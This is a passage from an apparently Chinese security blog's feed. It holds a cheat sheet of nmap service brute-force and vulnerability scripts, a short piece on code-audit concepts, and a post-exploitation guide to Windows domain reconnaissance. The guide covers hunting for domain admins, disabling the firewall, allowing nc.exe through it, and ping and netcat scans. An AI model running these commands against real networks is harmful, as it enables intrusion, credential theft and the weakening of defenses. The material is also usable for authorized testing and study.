class="zsh">     nmap -p 9088 --script informix-brute.nse 192.168.3.23</code></pre><h3 id="扫描CouchDB服务"><a href="#扫描CouchDB服务" class="headerlink" title="扫描CouchDB服务"></a>扫描CouchDB服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 5984 --script &quot;couchdb-*&quot; &lt;host&gt;</code></pre><h3 id="扫Redis服务"><a href="#扫Redis服务" class="headerlink" title="扫Redis服务"></a>扫Redis服务</h3><pre><code class="zsh">redis爆破                        # nmap -p 6379 --script redis-brute.nse 192.168.3.0/24redis未访问授权                   # nmap -p6379 —-script redis-info 192.168.3.0/24</code></pre><h3 id="扫描MySQL服务"><a href="#扫描MySQL服务" class="headerlink" title="扫描MySQL服务"></a>扫描MySQL服务</h3><pre><code class="zsh">    mysql-info                       ·# nmap -sV  -p -sV 3306 --script mysql-info &lt;host&gt;    mysql 扫描root空密码                # nmap -p 3306 --script mysql-empty-password.nse -v &lt;host&gt;    mysql root弱口令简单爆破             # nmap -p 3306 --script mysql-brute.nse -v &lt;host&gt;    导出mysql中所有用户的hash            # nmap -p 3306 --script mysql-dump-hashes --script-args=&#39;username=root,password=root’ &lt;host&gt;     Mysql身份认证漏洞                    # nmap -p 3306 --script mysql-vuln-cve2012-2122.nse  -v &lt;host&gt;</code></pre><h3 id="扫描memcached服务"><a href="#扫描memcached服务" class="headerlink" title="扫描memcached服务"></a>扫描memcached服务</h3><pre><code class="zsh">验证Memcached未授权访问漏洞        # nmap -sV -p11211 —script memcached-info 192.168.1.2/24</code></pre><h3 id="扫描PostgreSQL服务"><a href="#扫描PostgreSQL服务" class="headerlink" title="扫描PostgreSQL服务"></a>扫描PostgreSQL服务</h3><pre><code class="zsh">尝试爆破postgresql                # nmap -p 5432 --script pgsql-brute -v 192.168.3.0/24</code></pre><h3 id="扫描Oracle服务"><a href="#扫描Oracle服务" class="headerlink" title="扫描Oracle服务"></a>扫描Oracle服务</h3><pre><code class="zsh">                   nmap -sV  -p -sV 1521 --script =oracle-tns-version &lt;host&gt; 尝试爆破oracle     # nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL -v 192.168.3.0/24                  # nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL  -v 192.168.3.0/24</code></pre><h3 id="扫描RDP服务"><a href="#扫描RDP服务" class="headerlink" title="扫描RDP服务"></a>扫描RDP服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 3389 --script rdp-enum-encryption &lt;host&gt;</code></pre><h3 id="扫描SSH服务"><a href="#扫描SSH服务" class="headerlink" title="扫描SSH服务"></a>扫描SSH服务</h3><pre><code class="zsh">    nmap   -p 22-sV  --script ssh2-enum-algos &lt;host&gt;</code></pre><h3 id="扫描VMware服务"><a href="#扫描VMware服务" class="headerlink" title="扫描VMware服务"></a>扫描VMware服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 443 --script vmware-version &lt;host&gt;</code></pre><h3 id="扫描VNC服务"><a href="#扫描VNC服务" class="headerlink" title="扫描VNC服务"></a>扫描VNC服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 5900 --script &quot;vnc-*&quot; &lt;host&gt;</code></pre><h3 id="扫描IMAP服务"><a href="#扫描IMAP服务" class="headerlink" title="扫描IMAP服务"></a>扫描IMAP服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 143 --script=&quot;imap-*&quot; &lt;host&gt;</code></pre><h3 id="扫描POP3服务"><a href="#扫描POP3服务" class="headerlink" title="扫描POP3服务"></a>扫描POP3服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 110,995 --script pop-3-ntlm-info &lt;host&gt;</code></pre><h3 id="扫描SMTP服务"><a href="#扫描SMTP服务" class="headerlink" title="扫描SMTP服务"></a>扫描SMTP服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 25 --script smtp-ntlm-info &lt;host&gt;</code></pre><h3 id="字典DICT服务"><a href="#字典DICT服务" class="headerlink" title="字典DICT服务"></a>字典DICT服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 2628 --script dict-info &lt;host&gt;</code></pre><h3 id="扫描IRC服务"><a href="#扫描IRC服务" class="headerlink" title="扫描IRC服务"></a>扫描IRC服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 6667 --script irc-info &lt;host&gt;</code></pre><h3 id="扫描硬盘监测服务"><a href="#扫描硬盘监测服务" class="headerlink" title="扫描硬盘监测服务"></a>扫描硬盘监测服务</h3><pre><code class="zsh">    nmap -sV  -p -sV 7634 --script hddtemp-info &lt;host&gt;</code></pre><h3 id="扫描Rsync服务"><a href="#扫描Rsync服务" class="headerlink" title="扫描Rsync服务"></a>扫描Rsync服务</h3><pre><code class="zsh">  rsync未授权访问  nmap -sV  -p -sV —-script rsync-brute —-script-args ‘rsync-brute.module=www’ &lt;target&gt;</code></pre><h3 id="扫描Elasticsearch服务"><a href="#扫描Elasticsearch服务" class="headerlink" title="扫描Elasticsearch服务"></a>扫描Elasticsearch服务</h3><pre><code class="zsh">验证Elasticsearch未访问授权    # nmap —-script http-vuln-cve2015-1427 —-script-args command=‘ls’  192.168.3.0/24 </code></pre><h3 id="MS12-020"><a href="#MS12-020" class="headerlink" title="MS12-020"></a>MS12-020</h3><pre><code class="zsh">    nmap -sV  -p3389 --script rdp-vuln-ms12-020 &lt;host&gt;</code></pre><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://t0data.gitbooks.io/nmap-nse/content/">精通Nmap脚本引擎</a><br><a href="https://blog.bbskali.cn/index.php/archives/1324/">CVE漏洞检测</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码审计概念</title>
      <link href="Coding/Audit/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E5%BF%B5.html"/>
      <url>Coding/Audit/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E5%BF%B5.html</url>
      
        <content type="html"><![CDATA[<p>程序=算法+代码<br>                    代码=函数+变量+（流程控制）</p><p>漏洞形成的条件：</p><ul><li>一、变量可控   一切输入都是有害的</li><li>二、变量传递到有利用价值的函数（可利用函数）</li></ul><p>漏洞造成的效果：<br>漏洞的利用效果取决于最终函数的功能<br>变量进入什么样的函数就会导致什么样的效果</p><p>危险函数：<br>函数的功能 导致 漏洞的种类</p><ul><li>文件包含：包含漏洞</li><li>代码执行：执行任意代码漏洞</li><li>命令执行：执行任意命令漏洞</li><li>文件系统操作：文件/目录 读写删除等漏洞</li><li>数据库操作：SQL注入漏洞</li><li>数据显示：xss等客户端漏洞</li><li>。。。</li></ul><p>变量跟踪分类：</p><ul><li>正向跟踪：通过变量找函数</li><li>逆向跟踪：通过函数找变量</li></ul><p>代码审计的本质<br>找漏洞=找对应变量与函数<br>变量就是漏洞（bug）本身，函数就是这个bug的爪子/衣服/种类</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
          <category> Audit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网信息收集</title>
      <link href="Kali/PostExploit/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html"/>
      <url>Kali/PostExploit/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-1-本机信息"><a href="#1-1-本机信息" class="headerlink" title="1.1. 本机信息"></a>1.1. 本机信息</h2><h3 id="1-1-1-手动收集"><a href="#1-1-1-手动收集" class="headerlink" title="1.1.1. 手动收集"></a>1.1.1. 手动收集</h3><h4 id="1-1-1-1-用户列表-管理员-net-user-net-localgroup-administrators"><a href="#1-1-1-1-用户列表-管理员-net-user-net-localgroup-administrators" class="headerlink" title="1.1.1.1. 用户列表/管理员 net user | net localgroup administrators"></a>1.1.1.1. 用户列表/管理员 <code>net user | net localgroup administrators</code></h4><p>当前在线用户 <code>query user</code></p><h4 id="1-1-1-2-网络配置-ipconfig-all"><a href="#1-1-1-2-网络配置-ipconfig-all" class="headerlink" title="1.1.1.2. 网络配置    ipconfig /all"></a>1.1.1.2. 网络配置    <code>ipconfig /all</code></h4><h4 id="1-1-1-3-操作系统及补丁-wmic-qfe-list-brief-gt-tmp-txt"><a href="#1-1-1-3-操作系统及补丁-wmic-qfe-list-brief-gt-tmp-txt" class="headerlink" title="1.1.1.3. 操作系统及补丁 wmic qfe list brief&gt;tmp.txt"></a>1.1.1.3. 操作系统及补丁 <code>wmic qfe list brief&gt;tmp.txt</code></h4><p>  当前系统信息 <code>systeminfo | findstr &quot;OS KB&quot;</code></p><h4 id="1-1-1-4-系统架构-echo-processor-architecture"><a href="#1-1-1-4-系统架构-echo-processor-architecture" class="headerlink" title="1.1.1.4. 系统架构 echo %processor_architecture%"></a>1.1.1.4. 系统架构 <code>echo %processor_architecture%</code></h4><h4 id="1-1-1-5-本机服务信息-wmic-service-list-brief-gt-tmp-txt"><a href="#1-1-1-5-本机服务信息-wmic-service-list-brief-gt-tmp-txt" class="headerlink" title="1.1.1.5. 本机服务信息 wmic service list brief&gt;tmp.txt"></a>1.1.1.5. 本机服务信息 <code>wmic service list brief&gt;tmp.txt</code></h4><h4 id="1-1-1-6-安装软件-wmic-product-get-name-version-installlocation-gt-tmp-txt"><a href="#1-1-1-6-安装软件-wmic-product-get-name-version-installlocation-gt-tmp-txt" class="headerlink" title="1.1.1.6. 安装软件 wmic product get name,version,installlocation &gt;tmp.txt"></a>1.1.1.6. 安装软件 <code>wmic product get name,version,installlocation &gt;tmp.txt</code></h4><p>利用PowerShell收集软件<br><code>&quot;Get-WmiObject -Class win32_product | Select-Object -Property name,version,installlocation&quot;</code></p><h4 id="1-1-1-7-端口列表-netstat-ano"><a href="#1-1-1-7-端口列表-netstat-ano" class="headerlink" title="1.1.1.7. 端口列表 netstat -ano"></a>1.1.1.7. 端口列表 <code>netstat -ano</code></h4><h4 id="1-1-1-8-进程列表-wmic-process-list-brief-gt-tmp-txt"><a href="#1-1-1-8-进程列表-wmic-process-list-brief-gt-tmp-txt" class="headerlink" title="1.1.1.8. 进程列表 wmic process list brief&gt;tmp.txt"></a>1.1.1.8. 进程列表 <code>wmic process list brief&gt;tmp.txt</code></h4><p>当前进程信息<code>tasklist</code></p><h4 id="1-1-1-9-开机自动程序-wmic-startup-list-brief-gt-tmp-txt"><a href="#1-1-1-9-开机自动程序-wmic-startup-list-brief-gt-tmp-txt" class="headerlink" title="1.1.1.9. 开机自动程序 wmic startup list brief &gt;tmp.txt"></a>1.1.1.9. 开机自动程序 <code>wmic startup list brief &gt;tmp.txt</code></h4><h4 id="1-1-1-10-计划任务-schtasks-query-fo-table-v-gt-tmp-txt"><a href="#1-1-1-10-计划任务-schtasks-query-fo-table-v-gt-tmp-txt" class="headerlink" title="1.1.1.10. 计划任务 schtasks /query /fo table /v &gt;tmp.txt"></a>1.1.1.10. 计划任务 <code>schtasks /query /fo table /v &gt;tmp.txt</code></h4><h4 id="1-1-1-11-本地计算机和所连接客户端之间会话-net-session"><a href="#1-1-1-11-本地计算机和所连接客户端之间会话-net-session" class="headerlink" title="1.1.1.11. 本地计算机和所连接客户端之间会话 net session"></a>1.1.1.11. 本地计算机和所连接客户端之间会话 <code>net session</code></h4><h4 id="1-1-1-12-本机共享列表-wmic-share-get-name-path-status-gt-tmp-txt"><a href="#1-1-1-12-本机共享列表-wmic-share-get-name-path-status-gt-tmp-txt" class="headerlink" title="1.1.1.12. 本机共享列表 wmic share get name,path,status &gt;tmp.txt"></a>1.1.1.12. 本机共享列表 <code>wmic share get name,path,status &gt;tmp.txt</code></h4><p>共享列表 <code>net share </code></p><h4 id="1-1-1-13-路由表-ARP缓存表-route-print-arp-a"><a href="#1-1-1-13-路由表-ARP缓存表-route-print-arp-a" class="headerlink" title="1.1.1.13. 路由表/ARP缓存表 route print | arp -a"></a>1.1.1.13. 路由表/ARP缓存表 <code>route print | arp -a</code></h4><h4 id="1-1-1-14-防火墙相关配置"><a href="#1-1-1-14-防火墙相关配置" class="headerlink" title="1.1.1.14. 防火墙相关配置"></a>1.1.1.14. 防火墙相关配置</h4><h5 id="1-1-1-14-1-查看防火墙配置-netsh-firewall-show-config"><a href="#1-1-1-14-1-查看防火墙配置-netsh-firewall-show-config" class="headerlink" title="1.1.1.14.1. 查看防火墙配置 netsh firewall show config"></a>1.1.1.14.1. 查看防火墙配置 <code>netsh firewall show config</code></h5><h5 id="1-1-1-14-2-关闭防火墙-netsh-advfirewall-set-allprofiles-state-off"><a href="#1-1-1-14-2-关闭防火墙-netsh-advfirewall-set-allprofiles-state-off" class="headerlink" title="1.1.1.14.2. 关闭防火墙 netsh advfirewall set allprofiles state off"></a>1.1.1.14.2. 关闭防火墙 <code>netsh advfirewall set allprofiles state off</code></h5><p>win2003之前版本 <code>netsh firewall set opmode disable</code></p><h5 id="1-1-1-14-3-修改防火墙配置"><a href="#1-1-1-14-3-修改防火墙配置" class="headerlink" title="1.1.1.14.3. 修改防火墙配置"></a>1.1.1.14.3. 修改防火墙配置</h5><ul><li><p>允许指定程序进入<br><code>netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: c.exe&quot;</code></p></li><li><p>允许指定程序外出<br><code>netsh advfirewall firewall add rule name=&quot;allow nc&quot; dir=out action=allow program=&quot;C: c.exe&quot;</code></p></li><li><p>允许3389端口放行<br><code>netsh advfirewall firewall add rule name=&quot;remote desktop&quot; protocol=TCP dir=in localport=3389 action=allow</code></p><blockquote><p>netsh firewall add allowedprogram c:<br>c.exe “allow nc” enable      #win2003之前版本</p></blockquote></li></ul><h5 id="1-1-1-14-4-更改防火墙日志文件存储"><a href="#1-1-1-14-4-更改防火墙日志文件存储" class="headerlink" title="1.1.1.14.4. 更改防火墙日志文件存储"></a>1.1.1.14.4. 更改防火墙日志文件存储</h5><p><code>netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</code></p><h4 id="1-1-1-15-代理配置-reg-query-quot-HKEY-CURRENT-USER-Software-Microsoft-Windows-CurrentVersion-Internet-Settings-quot"><a href="#1-1-1-15-代理配置-reg-query-quot-HKEY-CURRENT-USER-Software-Microsoft-Windows-CurrentVersion-Internet-Settings-quot" class="headerlink" title="1.1.1.15. 代理配置 reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;"></a>1.1.1.15. 代理配置 <code>reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</code></h4><h4 id="1-1-1-16-开启RDP服务"><a href="#1-1-1-16-开启RDP服务" class="headerlink" title="1.1.1.16. 开启RDP服务"></a>1.1.1.16. 开启RDP服务</h4><ul><li>查询<br><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code></li></ul><h3 id="1-1-2-自动收集"><a href="#1-1-2-自动收集" class="headerlink" title="1.1.2. 自动收集"></a>1.1.2. 自动收集</h3><h4 id="1-1-2-1-wmic信息收集"><a href="#1-1-2-1-wmic信息收集" class="headerlink" title="1.1.2.1. wmic信息收集"></a>1.1.2.1. <a href="www.fuzzysecurity.com/scripts/files/wmic_info.rar">wmic</a>信息收集</h4><h4 id="1-1-2-2-Empire信息收集"><a href="#1-1-2-2-Empire信息收集" class="headerlink" title="1.1.2.2. Empire信息收集"></a>1.1.2.2. <a href="https://github.com/BC-SECURITY/Empire.git">Empire</a>信息收集</h4><h2 id="1-2-判断域环境"><a href="#1-2-判断域环境" class="headerlink" title="1.2. 判断域环境"></a>1.2. 判断域环境</h2><h3 id="1-2-1-是否存在域-systeminfo-findstr-quot-quot"><a href="#1-2-1-是否存在域-systeminfo-findstr-quot-quot" class="headerlink" title="1.2.1. 是否存在域 systeminfo | findstr &quot;\.&quot;"></a>1.2.1. 是否存在域 <code>systeminfo | findstr &quot;\.&quot;</code></h3><h3 id="1-2-2-DNS与本机是否网段-ipconfig-all"><a href="#1-2-2-DNS与本机是否网段-ipconfig-all" class="headerlink" title="1.2.2. DNS与本机是否网段 ipconfig /all"></a>1.2.2. DNS与本机是否网段 <code>ipconfig /all</code></h3><h3 id="1-2-3-DNS与域是否同IP-nslookup-hacker-testlab"><a href="#1-2-3-DNS与域是否同IP-nslookup-hacker-testlab" class="headerlink" title="1.2.3. DNS与域是否同IP nslookup hacker.testlab"></a>1.2.3. DNS与域是否同IP <code>nslookup hacker.testlab</code></h3><h3 id="1-2-4-当前登录域及登录用户信息-net-config-workstation"><a href="#1-2-4-当前登录域及登录用户信息-net-config-workstation" class="headerlink" title="1.2.4. 当前登录域及登录用户信息 net config workstation"></a>1.2.4. 当前登录域及登录用户信息 <code>net config workstation</code></h3><h3 id="1-2-5-判段主域-net-time-domain"><a href="#1-2-5-判段主域-net-time-domain" class="headerlink" title="1.2.5. 判段主域 net time /domain"></a>1.2.5. 判段主域 <code>net time /domain</code></h3><h3 id="1-2-6-获取域SID-whoami-all"><a href="#1-2-6-获取域SID-whoami-all" class="headerlink" title="1.2.6. 获取域SID whoami /all"></a>1.2.6. 获取域SID <code>whoami /all</code></h3><h3 id="1-2-7-指定域用户详细信息-net-user-xxx-domain"><a href="#1-2-7-指定域用户详细信息-net-user-xxx-domain" class="headerlink" title="1.2.7. 指定域用户详细信息 net user xxx /domain"></a>1.2.7. 指定域用户详细信息 <code>net user xxx /domain</code></h3><h2 id="1-3-搜集域内基础信息"><a href="#1-3-搜集域内基础信息" class="headerlink" title="1.3. 搜集域内基础信息"></a>1.3. 搜集域内基础信息</h2><h3 id="1-3-1-查询域-net-view-domain"><a href="#1-3-1-查询域-net-view-domain" class="headerlink" title="1.3.1. 查询域 net view /domain"></a>1.3.1. 查询域 <code>net view /domain</code></h3><h3 id="1-3-2-查询域内所有主机-net-view-domain-hacker"><a href="#1-3-2-查询域内所有主机-net-view-domain-hacker" class="headerlink" title="1.3.2. 查询域内所有主机 net view /domain:hacker"></a>1.3.2. 查询域内所有主机 <code>net view /domain:hacker</code></h3><h3 id="1-3-3-查询域内所有用户组列表-net-group-domain"><a href="#1-3-3-查询域内所有用户组列表-net-group-domain" class="headerlink" title="1.3.3. 查询域内所有用户组列表 net group /domain"></a>1.3.3. 查询域内所有用户组列表 <code>net group /domain</code></h3><h3 id="1-3-4-查询域内成员计算机列表-net-gorup-quot-domain-computers-quot-domain"><a href="#1-3-4-查询域内成员计算机列表-net-gorup-quot-domain-computers-quot-domain" class="headerlink" title="1.3.4. 查询域内成员计算机列表 net gorup &quot;domain computers&quot; /domain "></a>1.3.4. 查询域内成员计算机列表 <code>net gorup &quot;domain computers&quot; /domain </code></h3><h3 id="1-3-5-获取域密码信息-net-accounts-domain"><a href="#1-3-5-获取域密码信息-net-accounts-domain" class="headerlink" title="1.3.5. 获取域密码信息 net accounts /domain "></a>1.3.5. 获取域密码信息 <code>net accounts /domain </code></h3><h3 id="1-3-6-获取域信任信息-nltest-domain-trusts"><a href="#1-3-6-获取域信任信息-nltest-domain-trusts" class="headerlink" title="1.3.6. 获取域信任信息 nltest /domain_trusts"></a>1.3.6. 获取域信任信息 <code>nltest /domain_trusts</code></h3><h2 id="1-4-查找域控制器"><a href="#1-4-查找域控制器" class="headerlink" title="1.4. 查找域控制器"></a>1.4. 查找域控制器</h2><h3 id="1-4-1-DC组-net-group-quot-domain-controllers-quot-domain"><a href="#1-4-1-DC组-net-group-quot-domain-controllers-quot-domain" class="headerlink" title="1.4.1. DC组 net group &quot;domain controllers&quot; /domain"></a>1.4.1. DC组 <code>net group &quot;domain controllers&quot; /domain</code></h3><h3 id="1-4-2-DC机器名-nltest-dclist-hacker"><a href="#1-4-2-DC机器名-nltest-dclist-hacker" class="headerlink" title="1.4.2. DC机器名 nltest /dclist:hacker"></a>1.4.2. DC机器名 <code>nltest /dclist:hacker</code></h3><h3 id="1-4-3-DC主机名-nslookup-type-srv-ldap-tcp"><a href="#1-4-3-DC主机名-nslookup-type-srv-ldap-tcp" class="headerlink" title="1.4.3. DC主机名 nslookup -type=srv _ldap._tcp"></a>1.4.3. DC主机名 <code>nslookup -type=srv _ldap._tcp</code></h3><h3 id="1-4-4-主域DC-netdom-query-pdc"><a href="#1-4-4-主域DC-netdom-query-pdc" class="headerlink" title="1.4.4. 主域DC netdom query pdc"></a>1.4.4. 主域DC <code>netdom query pdc</code></h3><h2 id="1-5-获取域内用户和管理员信息"><a href="#1-5-获取域内用户和管理员信息" class="headerlink" title="1.5. 获取域内用户和管理员信息"></a>1.5. 获取域内用户和管理员信息</h2><h3 id="1-5-1-域内用户列表-net-user-domain"><a href="#1-5-1-域内用户列表-net-user-domain" class="headerlink" title="1.5.1. 域内用户列表 net user /domain"></a>1.5.1. 域内用户列表 <code>net user /domain</code></h3><h3 id="1-5-2-域管理员用户-net-group-quot-domain-admins-quot-domain"><a href="#1-5-2-域管理员用户-net-group-quot-domain-admins-quot-domain" class="headerlink" title="1.5.2. 域管理员用户 net group &quot;domain admins&quot; /domain "></a>1.5.2. 域管理员用户 <code>net group &quot;domain admins&quot; /domain </code></h3><p>  <code>net group &quot;enterprise admins&quot; /domain</code></p><h3 id="1-5-3-域内用户详细信息-wmic-useraccount-get-all"><a href="#1-5-3-域内用户详细信息-wmic-useraccount-get-all" class="headerlink" title="1.5.3. 域内用户详细信息 wmic useraccount get /all"></a>1.5.3. 域内用户详细信息 <code>wmic useraccount get /all</code></h3><h3 id="1-5-4-域内存在的用户-dsquery-user"><a href="#1-5-4-域内存在的用户-dsquery-user" class="headerlink" title="1.5.4. 域内存在的用户 dsquery user"></a>1.5.4. 域内存在的用户 <code>dsquery user</code></h3><h2 id="1-6-定位域管理员"><a href="#1-6-定位域管理员" class="headerlink" title="1.6. 定位域管理员"></a>1.6. 定位域管理员</h2><h3 id="1-6-1-psloggedon-exe-DC"><a href="#1-6-1-psloggedon-exe-DC" class="headerlink" title="1.6.1. psloggedon.exe  \\DC"></a>1.6.1. <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">psloggedon.exe</a>  \\DC</h3><h3 id="1-6-2-PVEFindADUser-exe-current"><a href="#1-6-2-PVEFindADUser-exe-current" class="headerlink" title="1.6.2. PVEFindADUser.exe -current"></a>1.6.2. <a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">PVEFindADUser.exe</a> -current</h3><h3 id="1-6-3-netview-exe"><a href="#1-6-3-netview-exe" class="headerlink" title="1.6.3. netview.exe"></a>1.6.3. <a href="https://github.com/mubix/netview.git">netview.exe</a></h3><h3 id="1-6-4-nmap-–script-smb-enum-sessions-lt-ip-gt"><a href="#1-6-4-nmap-–script-smb-enum-sessions-lt-ip-gt" class="headerlink" title="1.6.4. nmap –script smb-enum-sessions  &lt;ip&gt;"></a>1.6.4. nmap –script smb-enum-sessions  &lt;ip&gt;</h3><ul><li>smb-enum-domains 对DC进行信息收集</li><li>smb-enum-users 枚举域内用户</li><li>smb-enum-shares 枚举共享目录</li><li>smb-enum-process 枚举进程</li><li>smb-enum-sessions 枚举域内用户登录会话</li><li>smb-os-discovery 收集系统信息</li></ul><h3 id="1-6-5-PowerSploit"><a href="#1-6-5-PowerSploit" class="headerlink" title="1.6.5. PowerSploit"></a>1.6.5. <a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">PowerSploit</a></h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="1-6-6-Empire-gt-situaltional-awareness-network-powerview-user-hunter"><a href="#1-6-6-Empire-gt-situaltional-awareness-network-powerview-user-hunter" class="headerlink" title="1.6.6. Empire &gt;situaltional_awareness/network/powerview/user_hunter"></a>1.6.6. Empire &gt;situaltional_awareness/network/powerview/user_hunter</h3><h2 id="1-7-查找域管理进程"><a href="#1-7-查找域管理进程" class="headerlink" title="1.7. 查找域管理进程"></a>1.7. 查找域管理进程</h2><h3 id="1-7-1-DC的域用户会话"><a href="#1-7-1-DC的域用户会话" class="headerlink" title="1.7.1. DC的域用户会话"></a>1.7.1. DC的域用户会话</h3><ul><li>域控制器列表 <code>net group &quot;domain controllers&quot; /domain &gt;dics.txt</code></li><li>域管理员列表 <code>net group &quot;domain admins&quot; /domain &gt;admins.txt</code></li><li>活动域会话列表 <code>netsess.exe -h</code></li><li><a href="https://github.com/nullbind/Other-Projects/tree/master/GDA">域用户会话-GDA</a></li></ul><pre><code class="ssh">  for /f %i in (dcs.txt) do  @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;null &gt;sessions.txt &amp;&amp;   for /f %a in (admins.txt) do  @type sessions.txt | @findstr /I %a</code></pre><h3 id="1-7-2-远程系统中运行的任务"><a href="#1-7-2-远程系统中运行的任务" class="headerlink" title="1.7.2. 远程系统中运行的任务"></a>1.7.2. 远程系统中运行的任务</h3><pre><code class="ssh">step1: net group &quot;domain admins&quot; /domain &gt; admins.txtstep2: netsess -h &gt;ips.txtstep3: for /f %ip in (ips.txt) do        @echo [+] %ip &amp;&amp; @tasklist /v /s %ip /U user /P password 2&gt;null &gt;output.txt &amp;&amp;       for /f %admin in (admins.txt) do       @type output.txt | @findstr %admin &gt;null &amp;&amp; @echo [!] %admin was found running a process on %ip &amp;&amp; pause</code></pre><h3 id="1-7-3-扫描远程系统NetBIOS信息"><a href="#1-7-3-扫描远程系统NetBIOS信息" class="headerlink" title="1.7.3. 扫描远程系统NetBIOS信息"></a>1.7.3. 扫描远程系统NetBIOS信息</h3><pre><code class="ssh">    for /f %ip in (ips.txt) do     @echo [+] Checking %ip &amp;&amp; nbtstat -A &amp;ip 2&gt;null &gt;nbsession.txt &amp;&amp;    for /f %user in (admins.txt) do    @type nbsessions.txt | findstr /I %user &gt;null &amp;&amp; echo [!] %user was found logged into %ip</code></pre><h3 id="1-7-4-域用户的进程-tasklist-v-findstr-quot-hacker-quot"><a href="#1-7-4-域用户的进程-tasklist-v-findstr-quot-hacker-quot" class="headerlink" title="1.7.4. 域用户的进程 tasklist /v | findstr &quot;hacker&quot; "></a>1.7.4. 域用户的进程 <code>tasklist /v | findstr &quot;hacker&quot; </code></h3><h2 id="1-8-域分析工具Bloodhound"><a href="#1-8-域分析工具Bloodhound" class="headerlink" title="1.8. 域分析工具Bloodhound"></a>1.8. 域分析工具<a href="https://github.com/BloodHoundAD/BloodHound/releases">Bloodhound</a></h2><h2 id="1-9-探测域内存活主机"><a href="#1-9-探测域内存活主机" class="headerlink" title="1.9. 探测域内存活主机"></a>1.9. 探测域内存活主机</h2><h3 id="1-9-1-利用NetBIOS探测-nbt-exe-192-168-1-0-24"><a href="#1-9-1-利用NetBIOS探测-nbt-exe-192-168-1-0-24" class="headerlink" title="1.9.1. 利用NetBIOS探测 nbt.exe 192.168.1.0/24"></a>1.9.1. 利用NetBIOS探测 <code>nbt.exe 192.168.1.0/24</code></h3><h3 id="1-9-2-利用ICMP协议探测"><a href="#1-9-2-利用ICMP协议探测" class="headerlink" title="1.9.2. 利用ICMP协议探测"></a>1.9.2. 利用ICMP协议探测</h3><pre><code class="ssh">for /L %I in (1,1,254) do @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;</code></pre><h3 id="1-9-3-利用ARP协议探测-arp-exe-t-192-168-1-0-24"><a href="#1-9-3-利用ARP协议探测-arp-exe-t-192-168-1-0-24" class="headerlink" title="1.9.3. 利用ARP协议探测 arp.exe -t 192.168.1.0/24"></a>1.9.3. 利用ARP协议探测 <code>arp.exe -t 192.168.1.0/24</code></h3><ul><li>Empire&gt;usemodule powershell/situational_awareness/network/arpscan</li><li>Powershell<ul><li><code>powershell.exe -exec bypass -command &quot;&amp; &#123;import-module C:\windows\temp\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/24&#125;&quot; &gt;&gt; C:\windows\temp\log.txt</code></li></ul></li></ul><h3 id="1-9-4-通过TCP-UDP协议探测-nmap-sT-sU"><a href="#1-9-4-通过TCP-UDP协议探测-nmap-sT-sU" class="headerlink" title="1.9.4. 通过TCP/UDP协议探测 nmap -sT -sU "></a>1.9.4. 通过TCP/UDP协议探测 <code>nmap -sT -sU </code></h3><h2 id="1-10-扫描域内端口"><a href="#1-10-扫描域内端口" class="headerlink" title="1.10. 扫描域内端口"></a>1.10. 扫描域内端口</h2><h3 id="1-10-1-netcat扫描"><a href="#1-10-1-netcat扫描" class="headerlink" title="1.10.1. netcat扫描"></a>1.10.1. netcat扫描</h3><pre><code class="ssh">nc -nvv -w 1 -z 10.1.1.1 3388-27017      //TCP  nc -nvv -w 1 -z -u 10.1.1.1 3388-3389   //UDP</code></pre><h3 